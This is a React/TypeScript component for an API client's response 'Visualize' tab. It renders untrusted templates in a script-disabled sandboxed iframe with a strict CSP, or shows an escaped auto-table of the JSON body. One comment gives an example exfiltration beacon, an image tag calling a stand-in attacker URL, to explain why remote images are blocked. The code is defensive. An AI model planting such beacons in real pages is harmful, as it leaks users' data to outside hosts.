import { useMemo } from 'react'
import type { ResponseResult, VisualizerPayload } from '@shared/types'
import { renderTemplate } from '@shared/visualizer-template'
import { Icon } from '@renderer/components/Icon'

/**
 * Response "Visualize" tab.
 *
 * Two modes:
 *  1. A test script called `pm.visualizer.set(template, data)` → we render the
 *     template against the data with the SAFE pure renderer and show the result
 *     inside a locked-down `<iframe sandbox>` (NO scripts, NO network beyond
 *     data: images, strict CSP). The template + data are untrusted.
 *  2. No template → a built-in, zero-config visualization of the JSON body
 *     (a table for an array of objects, otherwise a note). This path renders via
 *     React (which escapes text) — never via dangerouslySetInnerHTML.
 */

/** A self-contained, script-disabled HTML document for the iframe. */
function buildSandboxDoc(innerHtml: string): string {
  // default-src 'none' blocks all loads; we permit ONLY inline styles and
  // data: images. Remote img-src is intentionally NOT allowed: with scripts
  // blocked (CSP + sandbox=""), an `<img src="https://attacker/?leak=…">` from
  // an untrusted template/data would otherwise be a blind data-exfiltration
  // beacon. data: images still work for embedded visualizations.
  const csp = "default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; media-src data:"
  const baseStyle = `
    :root { color-scheme: light dark; }
    body { font: 13px/1.6 -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 14px; color: #1c1c22; background: transparent; }
    @media (prefers-color-scheme: dark) { body { color: #e6e6ea; } }
    table { border-collapse: collapse; width: 100%; font-size: 12.5px; }
    th, td { border: 1px solid rgba(127,127,127,.3); padding: 6px 9px; text-align: left; vertical-align: top; }
    th { background: rgba(127,127,127,.12); font-weight: 600; }
    pre, code { font-family: ui-monospace, 'SF Mono', Menlo, monospace; font-size: 12px; }
    img { max-width: 100%; }
    a { color: inherit; }
  `
  return `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${csp}"><style>${baseStyle}</style></head><body>${innerHtml}</body></html>`
}

function TemplateView({ payload }: { payload: VisualizerPayload }): JSX.Element {
  const doc = useMemo(() => {
    let inner: string
    try {
      inner = renderTemplate(payload.template, payload.data)
    } catch {
      inner = '<p>Не удалось отрендерить шаблон визуализатора.</p>'
    }
    return buildSandboxDoc(inner)
  }, [payload])

  return (
    <iframe
      className="preview-frame"
      title="Визуализация ответа"
      // sandbox="" → scripts, forms, same-origin, popups all disabled.
      sandbox=""
      srcDoc={doc}
      style={{ width: '100%', height: '100%', border: 0, background: 'transparent' }}
    />
  )
}

/** Build a column set as the union of keys across the rows (stable order). */
function unionKeys(rows: Record<string, unknown>[]): string[] {
  const keys: string[] = []
  const seen = new Set<string>()
  for (const row of rows) {
    for (const k of Object.keys(row)) {
      if (!seen.has(k)) {
        seen.add(k)
        keys.push(k)
      }
    }
  }
  return keys
}

function cellText(v: unknown): string {
  if (v === null || v === undefined) return ''
  if (typeof v === 'object') {
    try {
      return JSON.stringify(v)
    } catch {
      return String(v)
    }
  }
  return String(v)
}

function AutoTable({ rows }: { rows: Record<string, unknown>[] }): JSX.Element {
  const cols = useMemo(() => unionKeys(rows), [rows])
  return (
    <div style={{ overflow: 'auto', height: '100%' }}>
      <table className="resp-table">
        <thead>
          <tr>
            {cols.map((c) => (
              <th key={c}>{c}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i}>
              {cols.map((c) => (
                <td key={c} className="hv">
                  {cellText(row[c])}
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

function EmptyViz({ hint }: { hint: string }): JSX.Element {
  return (
    <div className="empty">
      <div className="empty-card">
        <div className="empty-ico">
          <Icon name="grid" size={22} />
        </div>
        <p style={{ marginBottom: 0 }}>{hint}</p>
      </div>
    </div>
  )
}

export function VisualizerTab({
  payload,
  result
}: {
  payload?: VisualizerPayload | null
  result: ResponseResult
}): JSX.Element {
  // Hooks must run unconditionally (Rules of Hooks) — compute the fallback parse
  // up front, then branch on what to render.
  const parsed = useMemo<unknown>(() => {
    const text = result.body.text
    if (!text) return undefined
    try {
      return JSON.parse(text)
    } catch {
      return undefined
    }
  }, [result.body.text])

  // 1. A script-provided visualizer template always wins.
  if (payload && payload.template) {
    return <TemplateView payload={payload} />
  }

  // 2. Zero-config fallback: auto-table for an array of plain objects.
  if (Array.isArray(parsed) && parsed.length > 0 && parsed.every((r) => r && typeof r === 'object' && !Array.isArray(r))) {
    return <AutoTable rows={parsed as Record<string, unknown>[]} />
  }

  return (
    <EmptyViz
      hint={
        'Нет визуализации. В тестовом скрипте вызовите pm.visualizer.set(template, data) — ' +
        'или верните JSON-массив объектов, чтобы увидеть авто-таблицу.'
      }
    />
  )
}
